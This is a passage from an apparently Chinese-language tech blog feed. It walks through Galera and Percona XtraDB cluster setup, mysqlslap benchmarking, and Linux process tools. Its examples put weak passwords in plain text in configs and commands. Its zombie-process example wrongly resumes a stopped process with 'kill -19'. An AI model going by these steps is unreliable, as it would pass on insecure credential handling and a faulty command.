class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;wsrep_on&#x27;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| wsrep_on      | ON    |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br>mysql&gt; SHOW STATUS LIKE <span class="hljs-string">&#x27;wsrep_cluster_size&#x27;</span>;<br>+--------------------+-------+<br>| Variable_name      | Value |<br>+--------------------+-------+<br>| wsrep_cluster_size | 3     |<br>+--------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br></code></pre></td></tr></table></figure><h5 id="（7）在PXC集群中加入节点"><a href="#（7）在PXC集群中加入节点" class="headerlink" title="（7）在PXC集群中加入节点"></a>（7）在PXC集群中加入节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在PXC集群中再加一台新的主机PXC4：10.0.0.37</span><br>[root@pxc4 ~]<span class="hljs-comment">#yum install Percona-XtraDB-Cluster-57 -y</span><br>[root@pxc4 ~]<span class="hljs-comment">#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf</span><br>[root@pxc4 ~]<span class="hljs-comment">#grep -Ev &quot;^#|^$&quot; /etc/percona-xtradb-cluster.conf.d/wsrep.cnf </span><br>[mysqld]<br>wsrep_provider=/usr/lib64/galera3/libgalera_smm.so<br>wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27,10.0.0.37 <span class="hljs-comment">#改</span><br>binlog_format=ROW<br>default_storage_engine=InnoDB<br>wsrep_slave_threads= 8<br>wsrep_log_conflicts<br>innodb_autoinc_lock_mode=2<br>wsrep_node_address=10.0.0.37 <span class="hljs-comment">#改</span><br>wsrep_cluster_name=pxc-cluster<br>wsrep_node_name=pxc-cluster-node-4 <span class="hljs-comment">#改</span><br>pxc_strict_mode=ENFORCING<br>wsrep_sst_method=xtrabackup-v2<br>wsrep_sst_auth=<span class="hljs-string">&quot;sstuser:s3cretPass&quot;</span>  <span class="hljs-comment">#改</span><br><br>[root@pxc4 ~]<span class="hljs-comment">#systemctl start mysql</span><br>[root@pxc4 ~]<span class="hljs-comment">#mysql -uroot -p123456</span><br>Server version: 5.7.27-30-57-<span class="hljs-built_in">log</span> Percona XtraDB Cluster (GPL), Release rel30, <br>Revision <br>mysql&gt; SHOW STATUS LIKE <span class="hljs-string">&#x27;wsrep_cluster_size&#x27;</span>;<br>+--------------------+-------+<br>| Variable_name      | Value |<br>+--------------------+-------+<br>| wsrep_cluster_size | 4     |<br>+--------------------+-------+<br><br><span class="hljs-comment">#将其它节点的配置文件加以修改</span><br>[root@pxc1 ~]<span class="hljs-comment">#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf</span><br>wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27,10.0.0.37<br>[root@pxc2 ~]<span class="hljs-comment">#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf</span><br>[root@pxc3 ~]<span class="hljs-comment">#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf</span><br></code></pre></td></tr></table></figure><hr><h4 id="实战案例：MariaDB-Galera-Cluster"><a href="#实战案例：MariaDB-Galera-Cluster" class="headerlink" title="实战案例：MariaDB Galera Cluster"></a>实战案例：MariaDB Galera Cluster</h4><h5 id="（1）centos8-实现MariaDB-Galera-Cluster"><a href="#（1）centos8-实现MariaDB-Galera-Cluster" class="headerlink" title="（1）centos8 实现MariaDB Galera Cluster"></a>（1）centos8 实现MariaDB Galera Cluster</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在三个节点上都实现</span><br>[root@centos8 ~]<span class="hljs-comment">#dnf install mariadb-server-galera -y</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /etc/my.cnf.d/galera.cnf</span><br><span class="hljs-comment">#wsrep_cluster_address=&quot;dummy://&quot; 在此行下面加一行</span><br>wsrep_cluster_address=<span class="hljs-string">&quot;gcomm://10.0.0.8,10.0.0.18,10.0.0.28&quot;</span>  <br><br><span class="hljs-comment">#启动第一节点</span><br>[root@centos8 ~]<span class="hljs-comment">#galera_new_cluster</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl enable mariadb</span><br><br><span class="hljs-comment">#再启动其它节点</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl enable --now mariadb</span><br>[root@centos8 ~]<span class="hljs-comment">#ss -ntl</span><br>State       Recv-Q Send-Q             Local Address:Port                            Peer Address:Port                            <br>LISTEN      0      128                            *:4567                                       *:*                  <br>LISTEN      0      80                            :::3306                                      :::*   <br><br><span class="hljs-comment">#验证</span><br>[root@centos8 ~]<span class="hljs-comment">#mysql</span><br>MariaDB [(none)]&gt;  show status like <span class="hljs-string">&quot;wsrep_ready&quot;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| wsrep_ready   | ON    |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br>MariaDB [(none)]&gt; SHOW STATUS LIKE <span class="hljs-string">&#x27;wsrep_cluster_size&#x27;</span>; <br>+--------------------+-------+<br>| Variable_name      | Value |<br>+--------------------+-------+<br>| wsrep_cluster_size | 3     |<br>+--------------------+-------+<br></code></pre></td></tr></table></figure><h5 id="（2）CentOS-7-实现-MariaDB-Galera-Cluster-5-5"><a href="#（2）CentOS-7-实现-MariaDB-Galera-Cluster-5-5" class="headerlink" title="（2）CentOS 7 实现 MariaDB Galera Cluster 5.5"></a>（2）CentOS 7 实现 MariaDB Galera Cluster 5.5</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#参考仓库：https://mirrors.tuna.tsinghua.edu.cn/mariadb/mariadb-5.5.X/yum/centos7-amd64/</span><br>yum install MariaDB-Galera-server<br>vim /etc/my.cnf.d/server.cnf<br>[galera]<br>wsrep_provider = /usr/lib64/galera/libgalera_smm.so<br>wsrep_cluster_address=<span class="hljs-string">&quot;gcomm://10.0.0.7,10.0.0.17,10.0.0.27&quot;</span><br>binlog_format=row<br>default_storage_engine=InnoDB<br>innodb_autoinc_lock_mode=2<br>bind-address=0.0.0.0<br><br><span class="hljs-comment">#下面配置可选项</span><br>wsrep_cluster_name = <span class="hljs-string">&#x27;mycluster&#x27;</span> 默认my_wsrep_cluster<br>wsrep_node_name = <span class="hljs-string">&#x27;node1&#x27;</span><br>wsrep_node_address = <span class="hljs-string">&#x27;10.0.0.7&#x27;</span><br><br><span class="hljs-comment">#首次启动时，需要初始化集群，在其中一个节点上执行命令</span><br>/etc/init.d/mysql start --wsrep-new-cluster<br><br><span class="hljs-comment">#而后正常启动其它节点</span><br>service mysql start<br><br><span class="hljs-comment">#查看集群中相关系统变量和状态变量</span><br>SHOW VARIABLES LIKE <span class="hljs-string">&#x27;wsrep_%&#x27;</span>;<br>SHOW STATUS LIKE <span class="hljs-string">&#x27;wsrep_%&#x27;</span>;<br>SHOW STATUS LIKE <span class="hljs-string">&#x27;wsrep_cluster_size&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><h3 id="3-3-TiDB"><a href="#3-3-TiDB" class="headerlink" title="3.3 TiDB"></a>3.3 TiDB</h3><blockquote><p>略</p></blockquote><h1 id="-5"><a href="#-5" class="headerlink" title=""></a></h1><hr><h1 id="七、MySQL压力测试"><a href="#七、MySQL压力测试" class="headerlink" title="七、MySQL压力测试"></a>七、MySQL压力测试</h1><h2 id="1-mysqlslap压力测试工具"><a href="#1-mysqlslap压力测试工具" class="headerlink" title="1 mysqlslap压力测试工具"></a>1 <strong>mysqlslap</strong>压力测试工具</h2><blockquote><p><strong>格式</strong></p><ul><li><code>mysqlslap [options]</code></li></ul><p><strong>常用参数</strong> <strong>[options]</strong> <strong>说明</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">--auto-generate-sql, -a <span class="hljs-comment">#自动生成测试表和数据，表示用mysqlslap工具自己生成的SQL脚本来测试并发压力</span><br>--auto-generate-sql-load-type=<span class="hljs-built_in">type</span> <span class="hljs-comment">#测试语句的类型。代表要测试的环境是读操作还是写操作还是两者混合的。取值包括：read，key，write，update和mixed(默认)</span><br>--auto-generate-sql-add-auto-increment <span class="hljs-comment">#代表对生成的表自动添加auto_increment列，从5.1.18版本开始支持</span><br>--number-char-cols=N, -x N <span class="hljs-comment">#自动生成的测试表中包含多少个字符类型的列，默认1</span><br>--number-int-cols=N, -y N <span class="hljs-comment">#自动生成的测试表中包含多少个数字类型的列，默认1</span><br>--number-of-queries=N <span class="hljs-comment">#总的测试查询次数(并发客户数×每客户查询次数)</span><br>--query=name,-q <span class="hljs-comment">#使用自定义脚本执行测试，例如可以调用自定义的存储过程或者sql语句来执行测试</span><br>--create-schema <span class="hljs-comment">#代表自定义的测试库名称，测试的schema</span><br>--commint=N <span class="hljs-comment">#多少条DML后提交一次</span><br>--compress, -C <span class="hljs-comment">#如服务器和客户端都支持压缩，则压缩信息</span><br>--concurrency=N, -c N <span class="hljs-comment">#表示并发量，即模拟多少个客户端同时执行select。可指定多个值，以逗号或者--delimiter参数指定值做为分隔符,如：--concurrency=100,200,500</span><br>--engine=engine_name, -e engine_name <span class="hljs-comment">#代表要测试的引擎，可以有多个，用分隔符隔开。例如：--engines=myisam,innodb</span><br>--iterations=N, -i N <span class="hljs-comment">#测试执行的迭代次数，代表要在不同并发环境下，各自运行测试多少次</span><br>--only-print <span class="hljs-comment">#只打印测试语句而不实际执行。</span><br>--detach=N <span class="hljs-comment">#执行N条语句后断开重连</span><br>--debug-info, -T <span class="hljs-comment">#打印内存和CPU的相关信息</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a><strong>使用示例</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#单线程测试</span><br>mysqlslap -a -uroot -p123456<br><br><span class="hljs-comment">#多线程测试。使用--concurrency来模拟并发连接</span><br>mysqlslap -a -c 100 -uroot -p123456<br><span class="hljs-comment">#迭代测试。用于需要多次执行测试得到平均值</span><br>mysqlslap -a -i 10 -uroot -p123456<br>mysqlslap ---auto-generate-sql-add-autoincrement -a<br>mysqlslap -a --auto-generate-sql-load-type=<span class="hljs-built_in">read</span><br>mysqlslap -a --auto-generate-secondary-indexes=3<br>mysqlslap -a --auto-generate-sql-write-number=1000<br>mysqlslap --create-schema world -q <span class="hljs-string">&quot;select count(*) from City&quot;</span><br>mysqlslap -a -e innodb -uroot -p123456<br>mysqlslap -a --number-of-queries=10 -uroot -p123456<br><br><span class="hljs-comment">#测试同时不同的存储引擎的性能进行对比</span><br>mysqlslap -a --concurrency=50,100 --number-of-queries 1000 --iterations=5 --engine=myisam,innodb --debug-info -uroot -p123456<br><br><span class="hljs-comment">#执行一次测试，分别50和100个并发，执行1000次总查询</span><br>mysqlslap -a --concurrency=50,100 --number-of-queries 1000 --debug-info -uroot -p123456<br><span class="hljs-comment">#50和100个并发分别得到一次测试结果(Benchmark)，并发数越多，执行完所有查询的时间越长。为了准确起见，可以多迭代测试几次</span><br>mysqlslap -a --concurrency=50,100 --number-of-queries 1000 --iterations=5 --debug-info -uroot -p123456<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux进阶技能</title>
    <link href="/2023/07/28/linux%E8%BF%9B%E9%98%B6%E6%8A%80%E8%83%BD/"/>
    <url>/2023/07/28/linux%E8%BF%9B%E9%98%B6%E6%8A%80%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="一、进程"><a href="#一、进程" class="headerlink" title="一、进程"></a>一、进程</h1><h2 id="1-进程和内存管理"><a href="#1-进程和内存管理" class="headerlink" title="1 进程和内存管理"></a>1 进程和内存管理</h2><h3 id="1-1-进程和线程的区别"><a href="#1-1-进程和线程的区别" class="headerlink" title="1.1 进程和线程的区别"></a>1.1 进程和线程的区别</h3><blockquote><ul><li>线程是程序执行的最小单位，而进程是操作系统分配资源的最小单位</li><li>一个进程由一个或多个线程组成，线程是一个进程中代码的不同执行路线</li><li>进程之间相互独立，但同一进程下的各个线程之间共享程序的内存空间(包括代码段、数据集、堆等)及一些进程级的资源(如打开文件和信号)，某进程内的线程在其它进程不可见</li><li>调度和切换：线程上下文切换比进程上下文切换要快得多</li></ul></blockquote><h3 id="1-2-查看进程中的线程"><a href="#1-2-查看进程中的线程" class="headerlink" title="1.2 查看进程中的线程"></a>1.2 查看进程中的线程</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">grep -i threads /proc/PID/status<br></code></pre></td></tr></table></figure><h3 id="1-3-进程使用内存管理问题"><a href="#1-3-进程使用内存管理问题" class="headerlink" title="1.3 进程使用内存管理问题"></a>1.3 进程使用内存管理问题</h3><h4 id="1-3-1-内存泄漏：Memory-Leak"><a href="#1-3-1-内存泄漏：Memory-Leak" class="headerlink" title="1.3.1 内存泄漏：Memory Leak"></a>1.3.1 内存泄漏：Memory Leak</h4><p>指程序中用malloc或new申请了一块内存，但是没有用free或delete将内存释放，导致这块内存一直处于占用状态</p><h4 id="1-3-2-内存溢出：Memory-Overflow"><a href="#1-3-2-内存溢出：Memory-Overflow" class="headerlink" title="1.3.2 内存溢出：Memory Overflow"></a>1.3.2 内存溢出：Memory Overflow</h4><p>指程序申请了10M的空间，但是在这个空间写入10M以上字节的数据，就是溢出</p><h4 id="1-3-3-内存不足：OOM（Out-Of-Memory）"><a href="#1-3-3-内存不足：OOM（Out-Of-Memory）" class="headerlink" title="1.3.3 内存不足：OOM（Out Of Memory）"></a>1.3.3 内存不足：OOM（Out Of Memory）</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202208/2927659-20220815201817630-1536494753.png"><img src="2927659-20220815201817630-1536494753.png" alt="img"></a></p><p>原因</p><ul><li>给应用分配内存太少：比如虚拟机本身可使用的内存（一般通过启动时的VM参数指定）太少</li><li>应用用的太多，并且用完没释放，浪费了。此时就会造成内存泄露或者内存溢出</li></ul><p>使用的解决办法：</p><ul><li>限制java进程的max heap，并且降低java程序的worker数量，从而降低内存使用</li><li>给系统增加swap空间</li></ul><h3 id="1-4-进程状态"><a href="#1-4-进程状态" class="headerlink" title="1.4 进程状态"></a>1.4 进程状态</h3><blockquote><ul><li>运行态：running</li><li>就绪态：ready</li><li>睡眠态：分为两种，可中断：interruptable，不可中断：uninterruptable</li><li>停止态：stopped，暂停于内存，但不会被调度，除非手动启动</li><li>僵死态：zombie，僵尸态，结束进程，父进程结束前，子进程不关闭，杀死父进程可以关闭僵死态的子进程</li></ul></blockquote><h4 id="范例：僵尸态"><a href="#范例：僵尸态" class="headerlink" title="范例：僵尸态"></a>范例：僵尸态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#父进程和子进程的创建</span><br>[root@rocky01 ~]<span class="hljs-comment"># bash</span><br>[root@rocky01 ~]<span class="hljs-comment"># echo $BASHPID</span><br>2267<br>[root@rocky01 ~]<span class="hljs-comment"># echo $PPID</span><br>2209<br>[root@rocky01 ~]<span class="hljs-comment"># pstree -p |grep 2209</span><br>           |-sshd(948)-+-sshd(2195)---sshd(2208)---bash(2209)---bash(2267)-+-grep(2289)<br><br><span class="hljs-comment">#将父进程设为停止态</span><br>[root@rocky01 ~]<span class="hljs-comment"># kill -19 2209</span><br><span class="hljs-comment">#杀死子进程，进入僵尸态</span><br>[root@rocky01 ~]<span class="hljs-comment"># kill -9 2267</span><br><span class="hljs-comment">#可以看到子进程STAT为Z，表示为僵尸态</span><br>[root@rocky01 ~]<span class="hljs-comment"># ps aux</span><br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root        2267  0.0  0.0      0     0 pts/0    Z+   20:25   0:00 [bash] &lt;defunct&gt;<br>root        2295  0.0  0.1  58752  3972 pts/1    R+   20:27   0:00 ps aux<br><br><span class="hljs-comment">#解决方法</span><br><span class="hljs-comment">#方法一：恢复父进程</span><br>[root@rocky01 ~]<span class="hljs-comment"># kill -19 2209</span><br><span class="hljs-comment">#方法二：杀死父进程</span><br>[root@rocky01 ~]<span class="hljs-comment"># kill -9 2209</span><br></code></pre></td></tr></table></figure><h4 id="范例：孤儿进程"><a href="#范例：孤儿进程" class="headerlink" title="范例：孤儿进程"></a>范例：孤儿进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># (sleep 100 &amp;)</span><br>[root@rocky01 ~]<span class="hljs-comment"># pstree -p |grep sleep</span><br>           |-<span class="hljs-built_in">sleep</span>(2342)<br></code></pre></td></tr></table></figure><h3 id="1-5-LRU算法"><a href="#1-5-LRU算法" class="headerlink" title="1.5 LRU算法"></a>1.5 LRU算法</h3><p>LRU：Least Recently Used 近期最少使用算法（喜新厌旧），释放内存</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202208/2927659-20220815204505794-361781002.png"><img src="2927659-20220815204505794-361781002.png" alt="img"></a></p><h3 id="1-6-IPC进程间通信"><a href="#1-6-IPC进程间通信" class="headerlink" title="1.6 IPC进程间通信"></a>1.6 IPC进程间通信</h3><h4 id="范例：利用管道文件实现-IPC"><a href="#范例：利用管道文件实现-IPC" class="headerlink" title="范例：利用管道文件实现 IPC"></a>范例：利用管道文件实现 IPC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># mkfifo test.fifo</span><br>[root@rocky01 ~]<span class="hljs-comment"># ll test.fifo</span><br>prw-r--r-- 1 root root 0 Aug 15 20:51 test.fifo<br>[root@rocky01 ~]<span class="hljs-comment"># echo Willoneday &gt; test.fifo</span><br><span class="hljs-comment">#此时为等待读入状态，读取数据后才会调到命令提示符</span><br><br><span class="hljs-comment">#在另一个终端可以从文件中读取数据</span><br>[root@rocky01 ~]<span class="hljs-comment"># cat test.fifo</span><br>Willoneday<br></code></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2927659/202208/2927659-20220815205630220-370188802.png"><img src="2927659-20220815205630220-370188802.png" alt="img"></a></p><h3 id="1-7-进程优先级"><a href="#1-7-进程优先级" class="headerlink" title="1.7 进程优先级"></a>1.7 进程优先级</h3><blockquote><ul><li>系统优先级：0-139, 数字越小，优先级越高,各有140个运行队列和过期队列</li><li>实时优先级: 99-0  值最大优先级最高</li><li>nice值：-20到19，对应系统优先级100-139或</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202208/2927659-20220815210009040-500560121.png"><img src="2927659-20220815210009040-500560121.png" alt="img"></a></p><hr><h2 id="2-进程管理和性能相关工具"><a href="#2-进程管理和性能相关工具" class="headerlink" title="2 进程管理和性能相关工具"></a>2 进程管理和性能相关工具</h2><blockquote><p>Linux系统状态的查看及管理工具：</p><p>pstree</p><p>ps</p><p>pidof</p><p>pgrep</p><p>top</p><p>htop</p><p>glance</p><p>pmap</p><p>vmstat</p><p>dstat</p><p>kill</p><p>pkill</p><p>job</p><p>bg</p><p>fg</p><p>nohup</p></blockquote><h3 id="2-1-pstree-进程树"><a href="#2-1-pstree-进程树" class="headerlink" title="2.1 pstree 进程树"></a>2.1 pstree 进程树</h3><blockquote><p>pstree 可以用来显示进程的父子关系，以树形结构显示</p></blockquote><p>格式：<code>pstree [ OPTION ] [ PID | USER ]</code></p><blockquote><p>常用选项：</p><ul><li>-p 显示PID</li><li>-T 不显示线程thread,默认显示线程</li><li>-u 显示用户切换</li><li>-H pid 高亮显示指定进程及其前辈进程</li></ul></blockquote><h3 id="2-2-ps-进程信息"><a href="#2-2-ps-进程信息" class="headerlink" title="2.2 ps 进程信息"></a>2.2 ps 进程信息</h3><blockquote><p>ps 即 process state，显示有关活动进程信息，<strong>Linux系统各进程的相关信息均保存在/proc/PID目录下的各文件中</strong></p><p>支持三种选项：</p><ul><li>UNIX选项 如: -A -e</li><li>GNU选项 如: –help</li><li>BSD选项 如: a</li></ul></blockquote><p>格式：<code>ps [ OPTION ]...</code></p><blockquote><p>常用选项：</p><ul><li><strong>a　选项包括所有终端中的进程</strong></li><li><strong>x　选项包括不链接终端的进程</strong></li><li><strong>u　选项显示进程所有者的信息</strong></li><li>f　选项显示进程树,相当于 –forest</li><li>k sort 属性 对属性排序,属性前加 - 表示倒序</li><li>o　属性… 选项显示定制的信息 pid、cmd、%cpu、%mem</li><li>L 显示支持的属性列表</li><li>-C cmdlist 指定命令，多个命令用，分隔</li><li>-L 显示线程</li><li><strong>-e 显示所有进程，相当于-A</strong></li><li><strong>-f 显示完整格式程序信息</strong></li><li>-F 显示更完整格式的进程信息</li><li>-H 以进程层级格式显示进程相关信息</li><li>-u userlist 指定有效的用户ID或名称</li><li>-U userlist 指定真正的用户ID或名称</li><li>-g gid或groupname 指定有效的gid或组名称</li><li>-G gid或groupname 指定真正的gid或组名称</li><li>-p pid 显示指pid的进程</li><li>–ppid pid 显示属于pid的子进程</li><li>-t ttylist 指定tty,相当于 t</li><li>-M 显示SELinux信息，相当于Z</li></ul></blockquote><h4 id="2-2-1-ps-输出信息"><a href="#2-2-1-ps-输出信息" class="headerlink" title="2.2.1 ps 输出信息"></a>2.2.1 ps 输出信息</h4><blockquote><ul><li>C :  ps -ef 显示列 C 表示cpu利用率</li><li>VSZ: Virtual memory SiZe，虚拟内存集，线性内存</li><li>RSS: ReSident Size, 常驻内存集</li><li>STAT：进程状态</li><li>R：running</li><li>S: interruptable sleeping</li><li>D: uninterruptable sleeping</li><li>T: stopped</li><li>Z: zombie</li><li>+: 前台进程</li><li>l: 多线程进程</li><li>L：内存分页并带锁</li><li>N：低优先级进程</li><li>&lt;: 高优先级进程</li><li>s: session leader，会话（子进程）发起者</li><li>I（大写i）：Idle kernel thread，CentOS 8 新特性</li><li>ni: nice值</li><li>pri: priority 优先级</li><li>rtprio: 实时优先级</li><li>psr: processor CPU编号</li></ul></blockquote><h4 id="范例：查看进程的特定属性"><a href="#范例：查看进程的特定属性" class="headerlink" title="范例：查看进程的特定属性"></a>范例：查看进程的特定属性</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># ps axo pid,cmd,%mem,%cpu</span><br>    PID CMD                         %MEM %CPU<br>      1 /usr/lib/systemd/systemd --  0.2  0.0<br>      2 [kthreadd]                   0.0  0.0<br>      3 [rcu_gp]                     0.0  0.0<br>      4 [rcu_par_gp]                 0.0  0.0<br>      6 [kworker/0:0H-events_highpr  0.0  0.0<br>      9 [mm_percpu_wq]               0.0  0.0<br>...省略...<br></code></pre></td></tr></table></figure><h4 id="范例：按CPU利用率倒序排序"><a href="#范例：按CPU利用率倒序排序" class="headerlink" title="范例：按CPU利用率倒序排序"></a>范例：按CPU利用率倒序排序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># ps aux k -%cpu</span><br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root         927  0.2  0.8 568912 31904 ?        Ssl  Aug29  13:31 /usr/libexec/platform-python -Es /usr<br>root       22116  0.1  0.0      0     0 ?        I    19:16   0:08 [kworker/0:1-mm_percpu_wq]<br>root           1  0.0  0.2 172768 11204 ?        Ss   Aug29   0:09 /usr/lib/systemd/systemd --switched-r<br>root           2  0.0  0.0      0     0 ?        S    Aug29   0:00 [kthreadd]<br>...省略...<br></code></pre></td></tr></table></figure><h4 id="面试题：找到未知进程的执行程序文件路径"><a href="#面试题：找到未知进程的执行程序文件路径" class="headerlink" title="面试题：找到未知进程的执行程序文件路径"></a>面试题：找到未知进程的执行程序文件路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># ll /proc/16642/exe</span><br>lrwxrwxrwx 1 root root 0 Aug 29 23:24 /proc/16642/exe -&gt; /data/httpd-2.4.54/bin/httpd<br></code></pre></td></tr></table></figure><h3 id="2-3-prtstat-查看进程信息"><a href="#2-3-prtstat-查看进程信息" class="headerlink" title="2.3 prtstat 查看进程信息"></a>2.3 prtstat 查看进程信息</h3><blockquote><p>可以显示进程信息,来自于psmisc包</p></blockquote><p>格式：<code>prtstat [ options ] PID ..</code></p><p>选项：<code>-r raw格式显示</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># prtstat -r 16642</span><br>         pid: 16642                            <span class="hljs-built_in">comm</span>: httpd<br>       state: S                                ppid: 